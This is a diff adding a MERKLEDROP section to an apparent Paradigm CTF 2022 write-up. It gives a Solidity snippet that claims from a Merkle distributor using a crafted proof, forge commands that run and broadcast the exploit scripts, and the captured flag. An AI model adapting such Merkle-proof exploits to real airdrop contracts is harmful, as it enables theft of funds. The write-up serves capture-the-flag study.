@@ -1,6 +1,8 @@
 # Paradigm CTF 2022 Writeup
 
 **Table of Contents**
+- [LOCKBOX2](#lockbox2)
+- [MERKLEDROP](#merkledrop)
 - [RANDOM](#random)
 - [SOURCECODE](#sourcecode)
 
@@ -47,6 +49,36 @@ Exploit:
 ```
 forge script Lockbox2ExploitScript --fork-url $RPC_PARADIGM --private-keys $PRIVATE_KEY1 --private-keys $PRIVATE_KEY2 --gas-limit 10000000 --sig "run(address)" $SETUP_ADDRESS -vvvvv --broadcast
 ```
+
+## MERKLEDROP
+
+Get vulnerable nodes:
+```
+python get_vulnerable_node.py
+```
+
+Example:
+```
+bytes32[] memory merkleProof = new bytes32[](5);
+merkleProof[0] = 0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d;
+merkleProof[1] = 0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde;
+merkleProof[2] = 0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813;
+merkleProof[3] = 0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c;
+merkleProof[4] = 0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5;
+merkleDistributor.claim(0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442, 0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A, 0x00000f40f0c122ae08d2207b, merkleProof);
+```
+
+Test:
+```
+forge test -vvvvv --match-contract MerkleDropExploitTest
+```
+
+Exploit:
+```
+forge script MerkleDropExploitScript --fork-url $RPC_PARADIGM --private-key $PRIVATE_KEY --gas-limit 10000000 --sig "run(address)" $SETUP_ADDRESS -vvvvv --broadcast
+```
+
+Flag `PCTF{N1C3_Pr00F_8r0}`
 
 ## RANDOM
 
